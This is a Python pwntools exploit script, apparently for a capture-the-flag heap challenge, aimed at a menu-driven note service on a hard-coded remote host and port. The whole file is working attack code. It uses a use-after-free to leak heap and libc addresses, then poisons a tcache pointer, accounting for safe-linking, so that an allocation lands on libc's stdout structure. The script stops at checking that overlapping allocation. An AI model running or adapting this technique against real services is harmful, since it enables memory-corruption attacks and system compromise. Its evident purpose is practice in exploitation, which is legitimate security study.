#!/usr/bin/env python3
from pathlib import Path
from pwn import *

context.arch = "amd64"
context.log_level = "info"
HOST, PORT = "144.79.188.39", 37415
libc = ELF(str(Path(__file__).with_name("libc") / "libc.so.6"), checksec=False)
UNSORTED = 0x21ACE0
SZ = 0xE0


def menu(io, c):
    io.sendlineafter(b"> ", str(c).encode())


def create(io, idx, size, data):
    menu(io, 1)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Data: ", data)


def readn(io, idx, n):
    menu(io, 2)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.recvuntil(b"Data: ")
    return io.recvn(n)


def edit(io, idx, data):
    menu(io, 3)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Data: ", data)


def delete(io, idx):
    menu(io, 4)
    io.sendlineafter(b"Index: ", str(idx).encode())


io = remote(HOST, PORT, timeout=10)
create(io, 0, SZ, b"A" * SZ)
create(io, 1, SZ, b"B" * SZ)
create(io, 2, 0x500, b"C" * 0x500)
create(io, 3, 0x20, b"G" * 0x20)

delete(io, 0)
raw0 = readn(io, 0, 16)
fd0 = u64(raw0[:8])
key0 = u64(raw0[8:16])
heap = fd0 << 12
log.info(f"fd0={hex(fd0)} key0={hex(key0)} heap={hex(heap)}")

delete(io, 2)
raw2 = readn(io, 2, 16)
libc.address = u64(raw2[:8]) - UNSORTED
log.info(f"unsorted={raw2[:16].hex()} libc={hex(libc.address)}")

delete(io, 1)
raw1 = readn(io, 1, 16)
fd1 = u64(raw1[:8])
key1 = u64(raw1[8:16])
dec = fd1 ^ (heap >> 12)
log.info(f"fd1={hex(fd1)} key1={hex(key1)} dec_next={hex(dec)}")
log.info(f"expect chunk0={hex(heap+0x2A0)} chunk1={hex(heap+0x2A0+0xF0)}")

stdout = libc.sym["_IO_2_1_stdout_"]
enc = stdout ^ (heap >> 12)
log.info(f"stdout={hex(stdout)} enc={hex(enc)}")

poison = p64(enc) + p64(key1)
edit(io, 1, poison)

raw_e = readn(io, 1, 16)
log.info(f"after edit {raw_e.hex()} fd={hex(u64(raw_e[:8]))} expect {hex(enc)}")

create(io, 4, SZ, b"D" * SZ)
# slot 4 should be old chunk1; slot 5 should be stdout
create(io, 5, SZ, b"E" * 8 + b"X" * (SZ - 8))
raw5 = readn(io, 5, 16)
log.info(f"slot5 {raw5.hex()}")
raw4 = readn(io, 4, 16)
log.info(f"slot4 {raw4.hex()}")
io.close()
